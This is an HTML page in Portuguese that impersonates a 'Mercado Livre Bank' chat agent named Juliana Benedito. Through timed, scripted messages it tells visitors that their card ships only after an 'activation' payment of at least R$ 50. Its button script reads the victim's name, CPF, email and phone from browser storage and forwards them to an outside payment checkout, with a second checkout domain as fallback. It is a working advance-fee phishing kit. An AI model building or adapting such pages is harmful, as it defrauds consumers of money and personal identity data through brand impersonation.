<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Chat Cart√£o ‚Äî Mercado Livre Bank</title>

  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="css/all.min.css" />
  <script src="js/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>

  <style>
    :root{
      --ml-yellow:#FFE600;
      --ml-blue:#3483fa;
      --ink:#1f1f1f;
      --muted:#8c8c8c;
      --card:#ffffff;
      --bg:#ebebeb;
    }
    *{box-sizing:border-box}
    body{
      margin:0; font-family:'Sora',sans-serif; background-color:var(--bg); color:var(--ink);
    }

    /* Header com fallback de texto se a logo quebrar */
    .header{
      display:flex; align-items:center; justify-content:center;
      padding:10px 12px; border-bottom:1px solid #aa9900;
      background-color:var(--ml-yellow);
      position:fixed; top:0; left:0; right:0; z-index:100;
    }
    .logo{ width:132px; height:auto; padding:8px; display:block; }
    .brand-fallback{
      display:none; font-weight:800; letter-spacing:.3px; color:#2b2b2b;
    }
    .chat-container{ max-width:640px; margin:82px auto 20px; padding:20px }

    .message{
      margin-bottom:22px; display:flex; flex-direction:column;
      opacity:0; transform:translateY(20px); transition:opacity .5s, transform .5s;
      scroll-margin-top:100px;
    }
    .message.show{ opacity:1; transform:translateY(0) }

    .message-header{
      display:flex; align-items:center; gap:10px; margin-bottom:6px;
      color:#393939; font-size:14px; font-weight:700;
    }
    .message-header .role{ font-weight:600; color:#444; font-size:12px }
    .avatar{ width:42px; height:42px; border-radius:50%; overflow:hidden; box-shadow:0 1px 2px rgba(0,0,0,.12) }
    .avatar img{ width:100%; height:100%; object-fit:cover; display:block }

    .message-content{
      background-color:var(--card); padding:15px; border-radius:10px;
      box-shadow:0 1px .5px rgba(0,0,0,0.13);
      max-width:85%; position:relative; margin-left:52px; display:none;
    }
    .message-content.show{ display:block }
    .message-content::before{
      content:""; position:absolute; top:0; left:-6px; width:0; height:0;
      border-top:10px solid var(--card); border-left:10px solid transparent;
    }

    .benefits-list{
      background:#f5f5f5; padding:14px; border-radius:8px; margin:10px 0; text-align:left;
      border:1px solid #ededed;
    }

    .button{
      background:linear-gradient(180deg, #ffe600, #f5d800);
      color:#000; padding:15px; border-radius:10px; border:none; width:100%;
      font-family:'Sora',sans-serif; font-weight:800; font-size:16px; cursor:pointer; margin-top:20px;
      opacity:0; transform:translateY(20px); transition:opacity .5s, transform .5s, box-shadow .2s;
      box-shadow:0 6px 18px rgba(255, 230, 0, .35);
    }
    .button.show{ opacity:1; transform:translateY(0) }
    .button:hover{ box-shadow:0 10px 24px rgba(255,230,0,.45) }

    .message-time{ font-size:11px; color:var(--muted); text-align:right; margin-top:5px }

    /* typing */
    .typing{
      display:none; gap:6px; padding:10px; background:var(--card); border-radius:10px;
      width:fit-content; margin-left:52px; opacity:0; position:relative; box-shadow:0 1px .5px rgba(0,0,0,.13)
    }
    .typing.show{ display:flex; opacity:1 }
    .typing::before{
      content:""; position:absolute; top:0; left:-6px; width:0; height:0;
      border-top:10px solid var(--card); border-left:10px solid transparent;
    }
    .typing span{ width:8px; height:8px; background:#93959f; border-radius:50%; animation:pulse 1s infinite }
    .typing span:nth-child(2){ animation-delay:.2s }
    .typing span:nth-child(3){ animation-delay:.4s }
    @keyframes pulse{ 0%,100%{ transform:scale(1); opacity:1 } 50%{ transform:scale(.7); opacity:.5 } }

    .message-text{ opacity:0; transition:opacity .3s }
    .message-text.show{ opacity:1 }
  </style>
</head>
<body>
  <div class="header">
    <img src="images/logo.png" alt="Mercado Livre Bank" class="logo"
         onerror="this.style.display='none';document.querySelector('.brand-fallback').style.display='block'">
    <div class="brand-fallback">Mercado <span style="color:#3483fa">Livre</span> Bank</div>
  </div>

  <div class="chat-container">
    <div style="background-color:#fff8e1;border-left:4px solid #FFE600;padding:15px;margin-bottom:30px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08)">
      <div style="display:flex;align-items:center;gap:12px">
        <i class="fas fa-info-circle" style="color:#b59f00;font-size:18px;"></i>
        <span style="color:#313131;font-size:14px">Fique na p√°gina! Essa √© a √∫ltima etapa para confirmar o envio do seu cart√£o.</span>
      </div>
    </div>

    <!-- ====== Mensagem 1 ====== -->
    <div class="message" id="message1">
      <div class="message-header">
        <div class="avatar">
          <!-- Avatar SVG embutido (sempre carrega) -->
          <img alt="Foto de perfil ‚Äî Juliana Benedito" id="avatar-juliana"
               src='data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160">
               <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="%233483fa"/><stop offset="1" stop-color="%232b6fdd"/></linearGradient></defs>
               <rect width="100%" height="100%" rx="80" ry="80" fill="url(%23g)"/>
               <text x="50%" y="54%" dominant-baseline="middle" text-anchor="middle"
                     font-family="Sora, Arial, sans-serif" font-weight="800" font-size="62" fill="white">JB</text>
               </svg>' />
        </div>
        <div>
          <strong>Juliana Benedito</strong>
          <div class="role">Gerente de Contas ‚Ä¢ Mercado Livre Bank</div>
        </div>
      </div>
      <div class="typing"><span></span><span></span><span></span></div>
      <div class="message-content">
        <div class="message-text">Ol√° üòä! Sou a Juliana, sua gerente de conta. Parab√©ns pelo limite que voc√™ conseguiu!<br><br>Mas para que possamos realizar o envio do seu cart√£o, √© necess√°rio uma √∫ltima etapa, a ativa√ß√£o da sua conta no Mercado Livre Bank!</div>
        <div class="message-time"></div>
      </div>

      <script>
        // Primeiro nome do usu√°rio (se existir) -> personaliza a sauda√ß√£o
        function getNomeUsuario(){
          try{
            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
            const nomeCompleto = dadosUsuario?.NOME || '';
            return (nomeCompleto.split(' ')[0] || '').trim();
          }catch(e){ return '' }
        }
        const primeiraMsg = document.querySelector('#message1 .message-text');
        const nomeUsuario = getNomeUsuario();
        if (nomeUsuario){
          primeiraMsg.innerHTML =
            `Ol√°, <strong>${nomeUsuario}</strong> üòä! Sou a Juliana, sua gerente de conta. Parab√©ns pelo limite que voc√™ conseguiu!<br><br>`+
            `Para realizarmos o envio do seu cart√£o, falta s√≥ a ativa√ß√£o da sua conta no <strong>Mercado Livre Bank</strong>.`;
        }
      </script>
    </div>

    <!-- ====== Mensagem 2 ====== -->
    <div class="message" id="message2">
      <div class="message-header">
        <div class="avatar"><img alt="Foto ‚Äî Juliana Benedito" src="#"
          onerror="this.src=document.getElementById('avatar-juliana').src"></div>
        <div>
          <strong>Juliana Benedito</strong>
          <div class="role">Gerente de Contas ‚Ä¢ Mercado Livre Bank</div>
        </div>
      </div>
      <div class="typing"><span></span><span></span><span></span></div>
      <div class="message-content">
        <div class="message-text">
          A ativa√ß√£o da sua conta leva menos de 1 minuto! Com ela ativa, voc√™ ter√° acesso a:
          <div class="benefits-list">
            ‚úÖ Saque de at√© 50% do limite<br>
            ‚úÖ Pix 24 horas<br>
            ‚úÖ Pagamento de boletos<br>
            ‚úÖ Cart√£o Virtual<br>
            ‚úÖ Atendimento online 24/7
          </div>
        </div>
        <div class="message-time"></div>
      </div>
    </div>

    <!-- ====== Mensagem 3 ====== -->
    <div class="message" id="message3">
      <div class="message-header">
        <div class="avatar"><img alt="Foto ‚Äî Juliana Benedito" src="#"
          onerror="this.src=document.getElementById('avatar-juliana').src"></div>
        <div>
          <strong>Juliana Benedito</strong>
          <div class="role">Gerente de Contas ‚Ä¢ Mercado Livre Bank</div>
        </div>
      </div>
      <div class="typing"><span></span><span></span><span></span></div>
      <div class="message-content">
        <div class="message-text">
          <script>
            const nome = getNomeUsuario();
            const msg = `Ativar sua conta √© simples: basta us√°-la pela primeira vez. Pode ser um PIX para um amigo ou o pagamento de uma conta (telefone, luz etc) com a sua nova conta do Mercado Livre Bank üéâ<br><br>`+
                        `O valor m√≠nimo para reconhecermos a ativa√ß√£o √© de <strong>R$ 50,00</strong>. Ele fica dispon√≠vel na sua conta para usar como quiser. Depois disso, seu limite e o cart√£o virtual liberam na hora.`;
            document.write( nome ? `${msg} Obrigado, ${nome}!` : msg );
          </script>
          <noscript>
            Ativar sua conta √© simples: basta us√°-la pela primeira vez. Pode ser um PIX para um amigo ou pagamento de contas (telefone, luz etc) com a sua nova conta do Mercado Livre Bank üéâ<br><br>
            O valor m√≠nimo para reconhecermos a ativa√ß√£o √© de <strong>R$ 50,00</strong>. Ele fica dispon√≠vel na sua conta para usar como quiser. Depois disso, seu limite e o cart√£o virtual liberam na hora.
          </noscript>
        </div>
        <div class="message-time"></div>
      </div>
    </div>

    <!-- ====== Mensagem 4 ====== -->
    <div class="message" id="message4">
      <div class="message-header">
        <div class="avatar"><img alt="Foto ‚Äî Juliana Benedito" src="#"
          onerror="this.src=document.getElementById('avatar-juliana').src"></div>
        <div>
          <strong>Juliana Benedito</strong>
          <div class="role">Gerente de Contas ‚Ä¢ Mercado Livre Bank</div>
        </div>
      </div>
      <div class="typing"><span></span><span></span><span></span></div>
      <div class="message-content">
        <div class="message-text">
          Para colocar saldo pela primeira vez na sua conta do Mercado Livre Bank e <strong>ativar sua conta</strong>, use o bot√£o abaixo.<br><br>
          Concluindo esta etapa, fazemos o envio do seu cart√£o.
        </div>
        <div class="message-time"></div>
      </div>
    </div>

    <button id="btnAtivar" class="button pulse2">Ativar minha conta agora</button>

    <style>
      @keyframes pulse2{
        0%{ box-shadow:0 0 0 0 rgba(255,230,0,.70) }
        70%{ box-shadow:0 0 0 16px rgba(255,230,0,0) }
        100%{ box-shadow:0 0 0 0 rgba(255,230,0,0) }
      }
      .pulse2{ animation:pulse2 2s infinite }
    </style>

    <script>
      function showMessage(messageId, delay){
        setTimeout(()=>{
          const message = document.getElementById(messageId);
          const typing  = message.querySelector('.typing');
          const content = message.querySelector('.message-content');
          const text    = message.querySelector('.message-text');
          const time    = message.querySelector('.message-time');

          const now = new Date();
          const hh  = now.getHours().toString().padStart(2,'0');
          const mm  = now.getMinutes().toString().padStart(2,'0');
          time.textContent = `${hh}:${mm}`;

          message.classList.add('show');
          typing.classList.add('show');

          const messageTop = message.offsetTop;
          const wh = window.innerHeight;
          const target = messageTop - (wh/4);

          window.scrollTo({ top: target, behavior:'smooth' });

          setTimeout(()=>{
            typing.classList.remove('show');
            content.classList.add('show');
            text.classList.add('show');

            const updatedTop = message.offsetTop;
            const target2 = updatedTop - (wh/4);
            window.scrollTo({ top: target2, behavior:'smooth' });
          }, 2000);
        }, delay);
      }

      // Sequ√™ncia
      showMessage('message1', 1500);
      showMessage('message2', 8000);
      showMessage('message3', 18500);
      showMessage('message4', 28500);

      // Apresenta CTA final
      setTimeout(()=>{
        const btn = document.getElementById('btnAtivar');
        btn.classList.add('show');
        window.scrollTo({ top: document.body.scrollHeight, behavior:'smooth' });
      }, 31500);

      // Redireciona mantendo UTMs + dados
      document.getElementById('btnAtivar').addEventListener('click', function(){
        try{
          const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
          const email = localStorage.getItem('email') || '';
          const telephone = localStorage.getItem('telefone') || '';

          const baseUrl = 'https://go.cinqpay.com.br/mcjdziim9p';
          const url = new URL(baseUrl);
          url.searchParams.append('name', dadosUsuario.NOME || '');
          url.searchParams.append('document', dadosUsuario.CPF || '');
          url.searchParams.append('email', email);
          url.searchParams.append('telephone', telephone);

          const finalUrl = buildUrlWithParams(url.toString());
          window.location.href = finalUrl;
        }catch(err){
          console.error('Erro ao redirecionar:', err);
          window.location.href = buildUrlWithParams('https://checkout.resolvaagora.chat/VCCL1O8SC39T');
        }
      });
    </script>
  </div>

  <!-- Helpers UTM -->
  <script>
    function getUrlParams(){
      const params={}; const urlParams=new URLSearchParams(window.location.search);
      for(const [k,v] of urlParams){ params[k]=v } return params;
    }
    function buildUrlWithParams(baseUrl){
      const params=getUrlParams(); const url=new URL(baseUrl, window.location.href);
      Object.keys(params).forEach(k=> url.searchParams.append(k, params[k]) );
      return url.toString();
    }
  </script>
</body>
</html>
